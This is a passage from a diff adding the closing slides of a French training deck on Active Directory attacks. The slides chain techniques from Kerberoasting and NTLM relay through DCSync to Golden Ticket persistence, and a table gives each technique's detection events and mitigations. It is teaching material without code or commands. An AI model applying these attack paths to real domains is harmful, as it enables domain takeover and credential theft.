+      <tr><td><strong>Vecteur d'attaque</strong></td><td>Compromettre le service + coercition</td><td>Compromettre le compte de service</td><td>GenericWrite sur Computer</td></tr>
+      <tr><td><strong>Impact</strong></td><td>Vol TGTs → DCSync</td><td>Impersonate tout user vers service</td><td>Impersonate tout user vers machine</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+<!-- =====================================================================
+     RÉCAPITULATIF
+     ===================================================================== -->
+<section>
+  <h2>Récapitulatif — Chemins d'attaque typiques</h2>
+  <div class="mbox" style="font-size:0.66em;line-height:1.9;">
+    <p class="my">Foothold : compte bas-privilège (spray, phishing, credential leak...)</p>
+    <p class="mc" style="margin-left:1em;">├─ Kerberoasting → crack mot de passe → compte service → PtH → admin local → dump hashes</p>
+    <p class="mc" style="margin-left:1em;">├─ AS-REP Roasting → crack mot de passe → compte domain → BloodHound → chemin vers DA</p>
+    <p class="mc" style="margin-left:1em;">├─ BloodHound → WriteDACL sur Domain → DCSync rights → secretsdump → hash krbtgt</p>
+    <p class="mc" style="margin-left:1em;">├─ Responder → NTLMv2 → Relay LDAP → RBCD → S4U2Self → admin machine → hashes</p>
+    <p class="mc" style="margin-left:1em;">├─ GenericWrite sur Computer → RBCD → S4U2Self → admin machine → hashes</p>
+    <p class="mc" style="margin-left:1em;">├─ GenericAll sur user DA → ForceChangePassword → authentification DA</p>
+    <p class="mc" style="margin-left:1em;">└─ Unconstrained Delegation + PrinterBug → TGT DC$ → DCSync</p>
+    <p class="mr" style="font-weight:bold;margin-top:0.5em;margin-left:2.5em;">→ Domain Admin → DCSync → hash krbtgt → Golden Ticket → Persistance totale</p>
+  </div>
+</section>
+
+<section>
+  <h2>Tableau synthétique des techniques</h2>
+  <table style="font-size:0.44em;">
+    <thead><tr><th style="width:14%;">Technique</th><th style="width:17%;">Prérequis</th><th style="width:14%;">Résultat</th><th style="width:9%;">Bruit</th><th style="width:23%;">Détection principale</th><th style="width:23%;">Mitigation principale</th></tr></thead>
+    <tbody>
+      <tr><td>Password Spraying</td><td>Liste de comptes</td><td>mot de passe en clair</td><td>Faible</td><td>4625 multiples comptes, fenêtre courte</td><td>Politique lockout, MFA, FIDO2</td></tr>
+      <tr><td>AS-REP Roasting</td><td><code>DONT_REQ_PREAUTH</code></td><td>Hash crackable offline</td><td>Très faible</td><td>4768 etype RC4 sans pré-auth</td><td>Activer pré-auth, surveiller attribut</td></tr>
+      <tr><td>Kerberoasting</td><td>SPN sur compte user</td><td>Hash ST crackable offline</td><td>Faible</td><td>4769 etype RC4 (0x17) en masse</td><td>gMSA / mot de passe &gt;25 car. aléatoires</td></tr>
+      <tr><td>Pass-the-Hash</td><td>NT hash</td><td>Auth NTLM sans mot de passe</td><td>Faible</td><td>4624 type 3 depuis source inattendue</td><td>Credential Guard, Protected Users</td></tr>
+      <tr><td>Overpass-the-Hash</td><td>NT hash</td><td>TGT Kerberos valide</td><td>Faible</td><td>4768 etype RC4 depuis source inattendue</td><td>Credential Guard, AES only</td></tr>
+      <tr><td>Pass-the-Ticket</td><td>Ticket en mémoire LSASS</td><td>Session Kerberos volée</td><td>Faible</td><td>4769 depuis IP source inattendue</td><td>Réduire lifetime TGT, détection anomalie</td></tr>
+      <tr><td>Silver Ticket</td><td>Hash compte de service</td><td>ST forgé vers service ciblé</td><td>Nul côté DC</td><td>Quasi-indétectable (KDC non consulté)</td><td>Validation PAC obligatoire côté service</td></tr>
+      <tr><td>Golden Ticket</td><td>Hash krbtgt</td><td>TGT forgé illimité</td><td>Faible</td><td>4769 anomalies PAC, groupes improbables</td><td>Double rotation krbtgt</td></tr>
+      <tr><td>Diamond Ticket</td><td>Hash krbtgt (AES)</td><td>TGT légitime + PAC modifié</td><td>Très faible</td><td>Très difficile — structure TGT légitime</td><td>Double rotation krbtgt</td></tr>
+      <tr><td>NTLM Relay</td><td>SMB/LDAP signing absent</td><td>Auth en tant que victime</td><td>Moyen</td><td>Réponses LLMNR/NBT-NS suspectes</td><td>SMB Signing requis, désactiver LLMNR/NBT-NS</td></tr>
+      <tr><td>DCSync</td><td>Droits DS-Replication</td><td>Tous les hashes du domaine</td><td>Faible</td><td>4662 GUID réplication depuis non-DC</td><td>Audit strict ACE sur objet Domaine</td></tr>
+      <tr><td>RBCD</td><td>WRITE_DAC/GenericAll sur Computer</td><td>Impersonate tout user sur machine</td><td>Faible</td><td>5136 modif. msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>Audit ACE Computer, MachineAccountQuota=0</td></tr>
+      <tr><td>AdminSDHolder</td><td>WRITE_DAC sur AdminSDHolder</td><td>Persistance sur tous comptes privil.</td><td>Nul</td><td>5136 sur CN=AdminSDHolder</td><td>Audit régulier AdminSDHolder + SDProp</td></tr>
+      <tr><td>Unconstrained Deleg.</td><td><code>TRUSTED_FOR_DELEGATION</code> hors DC</td><td>Vol TGT en mémoire → DCSync</td><td>Faible</td><td>Rubeus monitor + TGTs en mémoire</td><td>Supprimer délég. non contrainte hors DC</td></tr>
+    </tbody>
+  </table>
+</section>
+
+
+<!-- FIN / TP -->
+<section class="ctr"
+  data-background-gradient="linear-gradient(135deg,#0d1117 0%,#161b22 60%,#1a1a2e 100%)">
+  <div style="border:2px solid #4cc9f0;padding:1.8em 2.5em;border-radius:10px;display:inline-block;min-width:72%;text-align:center;">
+    <h2 style="color:#4cc9f0;font-size:1.3em;margin-bottom:0.4em;">Place au TP</h2>
+    <p style="color:#aaa;font-size:0.8em;margin:0.5em 0;">BloodHound CE - Analyse d'un domaine simulé</p>
+    <p style="color:#aaa;font-size:0.8em;margin:0 0 0.5em;">Requêtes Cypher progressives - Identification de chemins d'attaque</p>
+    <hr style="border:none;border-top:1px solid #333;margin:0.8em 0;">
+    <p style="font-size:0.48em;color:#555;margin:0;">© Volker Carstein - Parabellum Services - 2026</p>
+  </div>
+</section>
+
+
+</div><!-- /slides -->
+</div><!-- /reveal -->
+
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/highlight.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/notes/notes.js"></script>
+<script>
+  Reveal.initialize({
+    hash: true,
+    slideNumber: 'c/t',
+    transition: 'slide',
+    transitionSpeed: 'fast',
+    controls: true,
+    progress: true,
+    center: false,
+    width: 1280,
+    height: 720,
+    margin: 0.04,
+    minScale: 0.2,
+    maxScale: 2.0,
+    plugins: [ RevealHighlight, RevealNotes ]
+  });
+</script>
+</body>
+</html>
